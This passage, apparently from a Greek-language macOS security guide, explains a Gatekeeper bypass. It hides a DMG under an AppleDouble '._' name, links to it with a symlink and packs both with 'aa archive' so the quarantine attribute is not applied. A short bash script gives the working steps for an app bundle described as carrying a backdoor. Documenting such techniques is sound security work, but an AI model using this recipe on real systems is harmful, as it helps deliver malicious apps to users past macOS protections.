Με τη δυνατότητα δημιουργίας ενός αρχείου που δεν θα έχει το χαρακτηριστικό καραντίνας, ήταν **δυνατό να παρακάμψουμε το Gatekeeper**. Το κόλπο ήταν να **δημιουργήσουμε ένα αρχείο DMG εφαρμογή** χρησιμοποιώντας το συμβατικό όνομα AppleDouble (ξεκινάμε με `._`) και να δημιουργήσουμε ένα **ορατό αρχείο ως σύνδεσμος προς αυτό το κρυφό** αρχείο χωρίς το χαρακτηριστικό καραντίνας.\
Όταν το **αρχείο dmg εκτελείται**, καθώς δεν έχει το χαρακτηριστικό καραντίνας, θα **παρακάμπτει το Gatekeeper**.

```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```

#### Αποτροπή Χαρακτηριστικού Καραντίνας

Σε ένα πακέτο ".app", αν το χαρακτηριστικό καραντίνας δεν προστεθεί σε αυτό, όταν το εκτελέσουμε **δεν θα ενεργοποιηθεί ο Gatekeeper**.



</details>
